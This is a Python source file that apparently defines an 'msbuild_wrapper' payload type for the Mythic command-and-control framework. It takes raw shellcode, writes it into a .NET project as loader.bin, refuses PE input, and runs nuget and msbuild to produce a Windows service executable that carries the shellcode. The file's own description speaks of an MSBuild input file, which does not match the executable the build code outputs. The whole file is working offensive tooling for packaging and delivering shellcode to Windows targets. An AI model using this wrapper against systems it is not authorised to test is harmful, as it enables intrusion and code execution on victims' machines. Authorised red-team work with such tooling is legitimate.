from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
import asyncio
import os
import tempfile
from distutils.dir_util import copy_tree
from pathlib import PurePath
import base64
from mythic_container.MythicRPC import *


class MSBuildWrapper(PayloadType):

    name = "msbuild_wrapper"
    file_extension = ""
    author = "@croucherk"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = []
    note = "This is a wrapper payload that takes in Raw shellcode and generates an input file that may be passed to MSBuild to execute arbitrary C# code. The payload does not perform any injection."
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose a target .NET Framework",
            choices=["3.5", "4.0"],
            default_value="4.0"
        ),
        BuildParameter(
            name="arch",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["x64", "Any CPU"],
            default_value="x64",
            description="Target architecture",
        ),
        BuildParameter(
            name="extension",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["xml"],
            default_value="xml",
            description="File extension for the payload",
        )
    ]
    c2_profiles = []
    agent_path = PurePath(".") / "msbuild_wrapper"
    agent_icon_path = agent_path / "msbuild_wrapper.svg"
    agent_code_path = agent_path / "agent_code"
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Copying files to temp location"),
        BuildStep(step_name="Checking", step_description="Checking for MZ header"),
        BuildStep(step_name="Building", step_description="Compiling with nuget and msbuild")
    ]


    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        output = ""
        try:
            command = "nuget restore; msbuild"
            command += " -p:TargetFrameworkVersion=v{} -p:OutputType=WinExe -p:Configuration='{}' -p:Platform='{}'".format(
                "3.5" if self.get_parameter("version") == "3.5" else "4.0",
                "Release",
                "x64" if self.get_parameter("arch") == "x64" else "Any CPU",
            )
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid).name
            # shutil to copy payload files over
            copy_tree(str(self.agent_code_path), agent_build_path)
            working_path = (
                PurePath(agent_build_path)
                / "WindowsService1"
                / "Resources"
                / "loader.bin"
            )
            with open(str(working_path), "wb") as f:
                f.write(self.wrapped_payload)
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))
            with open(str(working_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":  # checking for MZ header of PE files
                    resp.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Checking",
                        StepStdout="Found leading MZ header - supplied file wasn't shellcode",
                        StepSuccess=True
                    ))
                    return resp
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Checking",
                StepStdout="No leading MZ header for payload",
                StepSuccess=True
            ))
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path,
            )
            stdout, stderr = await proc.communicate()
            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"
            output_path = (
                PurePath(agent_build_path)
                / "WindowsService1"
                / "bin"
                / "Release"
                / "WindowsService1.exe"
            )
            output_path = str(output_path)
            if os.path.exists(output_path):
                resp.payload = open(output_path, "rb").read()
                resp.status = BuildStatus.Success
                resp.build_message = "New Service Executable created!"
            else:
                resp.payload = b""
                resp.build_stderr = output + "\n" + output_path
        except Exception as e:
            raise Exception(str(e) + "\n" + output)
        return resp
